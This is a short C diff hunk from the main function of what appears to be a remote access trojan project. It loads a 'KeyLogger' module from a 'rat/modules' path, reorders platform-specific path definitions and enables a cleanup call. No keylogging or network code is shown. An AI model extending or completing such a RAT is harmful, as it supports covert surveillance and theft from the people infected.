@@ -28,21 +28,21 @@ load_all_modules(char *mods[], char *mod_path) {
 
 int main(void) {
 
+#ifdef _WIN32
+	char *mod_path = "C:\\Users\\User\\";
+#endif
 #ifdef linux
 	char *mod_path = "/home/venus/projects/rat/modules/";
 #endif
-#ifdef _WIN32
 
-	char *mod_path = "C:\\Users\\User\\";
-#endif
 	char *mods[] = {
-		"keylogger",
+		"KeyLogger",
 		NULL
 	};
 
 	load_all_modules(mods, mod_path);
 	list_modules();
-	//clean_modules();
+	clean_modules();
 	/*
 	* Debug code until we write the client
 
